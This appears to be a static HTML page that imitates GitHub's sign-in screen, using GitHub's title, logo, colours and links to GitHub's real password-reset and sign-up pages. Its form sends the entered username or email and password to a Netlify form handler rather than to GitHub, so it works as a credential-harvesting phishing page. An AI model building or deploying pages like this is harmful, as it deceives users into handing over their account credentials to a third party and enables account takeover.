<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <link rel="stylesheet" href="style.css">
    <!-- bootstrap link -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
    <link rel="icon" href="/Pictures/GitHub-Mark-Light-120px-plus.png">
    <title>Sign in to GitHub.GitHub</title>
</head>

<body style=" background-color:#0d1117">
    <div class="container" >
        <div class="row ">
            <div class="col-lg-12 ">

            
               <div class="all mt-4 ">
                   <center>
                       <img src="/Pictures/GitHub-Mark-Light-120px-plus.png" id="github" alt="github page">
                    <h1 class="github_txt mb-3">Sign in to GitHub </h1>
                    <form action=""  class="log_in_form" method="POST" data-netlify="true"  name="Github"  >
                        <label for="" class="user_label mt-3 ">Username or email address </label><br>


                        <input type="text" autofocus="of" name="email"class="user" name="usernam">
                        <div class="password_forgot">
                            <label for="" class="password_label">Password</label><br>
                            <p id="pass"> <a href="https://github.com/password_reset" id="forget"> Forgot password?</a></p>

                        </div>
                        <input type="password" name="Password" class="password" name="password"><br>
                        <button class="btn_sign" type="submit" >Sign in</button>




                    </form>
                    <div class="create_account">
                        <p class="new_git" >New to Github <a href="https://github.com/join?source=login" id="createlink" >Create an account</a>  </p>

                    </div>
                </center>

                </div>
             </div>


        </div>




    </div>





<!-- javascript link -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns" crossorigin="anonymous"></script>
    <script src="/script.js"></script>
</body>
</html>
